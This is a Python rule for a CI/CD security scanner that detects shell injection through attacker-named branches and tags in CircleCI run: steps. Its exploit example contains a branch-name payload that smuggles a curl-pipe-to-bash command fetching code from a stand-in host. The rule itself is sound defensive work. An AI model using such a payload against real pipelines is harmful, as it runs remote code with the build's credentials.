"""CC-002, run: commands must not interpolate attacker-controllable env vars."""
from __future__ import annotations

import re
from typing import Any

from ..._yaml_lines import line_of as _line_of
from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_run_commands
from ._helpers import UNTRUSTED_ENV_RE

# CircleCI native ``<< ... >>`` interpolation of an attacker-controlled
# value. ``pipeline.git.branch`` / ``pipeline.git.tag`` resolve from the
# branch / tag name, which an attacker names. ``<< pipeline.parameters.* >>``
# is deliberately NOT matched: pipeline parameters are typed and set by the
# triggering workflow, and are the recommended safe alternative.
_UNTRUSTED_INTERP_RE = re.compile(r"<<\s*pipeline\.git\.(?:branch|tag)\s*>>")

RULE = Rule(
    id="CC-002",
    title="Script injection via untrusted environment variable",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78",),
    recommendation=(
        "Do not interpolate attacker-controllable environment variables "
        "(CIRCLE_BRANCH, CIRCLE_TAG, CIRCLE_PR_NUMBER, etc.) directly "
        "into shell commands. Pass them through an intermediate variable "
        "and quote them, or use CircleCI pipeline parameters instead."
    ),
    docs_note=(
        "CircleCI exposes environment variables like `$CIRCLE_BRANCH`, "
        "`$CIRCLE_TAG`, and `$CIRCLE_PR_NUMBER` that are controlled by "
        "the event source (branch name, tag, PR). Interpolating them "
        "unquoted into `run:` commands allows shell injection via "
        "specially crafted branch or tag names. The same applies to the "
        "native `<< pipeline.git.branch >>` / `<< pipeline.git.tag >>` "
        "interpolations, which CircleCI splices into the command at "
        "config-compile time straight from the (attacker-named) ref. "
        "`<< pipeline.parameters.* >>` is the safe alternative: typed and "
        "set by the triggering workflow, not by a ref name."
    ),
    exploit_example=(
        "# Vulnerable: a branch named ``feat;curl evil|bash;``\n"
        "# lands in the shell verbatim via ``$CIRCLE_BRANCH``. The\n"
        "# injected ``curl`` runs in the step's shell with the\n"
        "# job's full credential set in scope.\n"
        "version: 2.1\n"
        "jobs:\n"
        "  build:\n"
        "    docker:\n"
        "      - image: alpine@sha256:abc123...\n"
        "    steps:\n"
        "      - run: |\n"
        "          echo \"Building $CIRCLE_BRANCH\"\n"
        "          ./build.sh --branch $CIRCLE_BRANCH\n"
        "\n"
        "# Safe: pass the branch name through a declared CircleCI\n"
        "# pipeline parameter. Pipeline parameters are set by the\n"
        "# triggering workflow, not by an attacker-controlled env var,\n"
        "# so injection via branch-name metacharacters is not possible.\n"
        "version: 2.1\n"
        "parameters:\n"
        "  deploy_branch:\n"
        "    type: string\n"
        "    default: main\n"
        "jobs:\n"
        "  build:\n"
        "    docker:\n"
        "      - image: alpine@sha256:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n"
        "    steps:\n"
        "      - run: |\n"
        "          echo \"Building << pipeline.parameters.deploy_branch >>\"\n"
        "          ./build.sh --branch \"<< pipeline.parameters.deploy_branch >>\""
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    seen_jobs: set[str] = set()
    for job_id, job in iter_jobs(doc):
        for idx, cmd in enumerate(iter_run_commands(job)):
            if UNTRUSTED_ENV_RE.search(cmd) or _UNTRUSTED_INTERP_RE.search(cmd):
                offenders.append(f"{job_id}[{idx}]")
                if job_id not in seen_jobs:
                    seen_jobs.add(job_id)
                    line = _line_of(job)
                    locations.append(Location(
                        path=path, start_line=line, end_line=line,
                    ))
    passed = not offenders
    desc = (
        "No `run:` command interpolates attacker-controllable environment "
        "variables."
        if passed else
        f"{len(offenders)} `run:` command(s) interpolate untrusted "
        f"environment variables (CIRCLE_BRANCH, CIRCLE_TAG, etc.): "
        f"{', '.join(offenders)}. These variables can contain shell "
        f"metacharacters that execute as part of the build."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
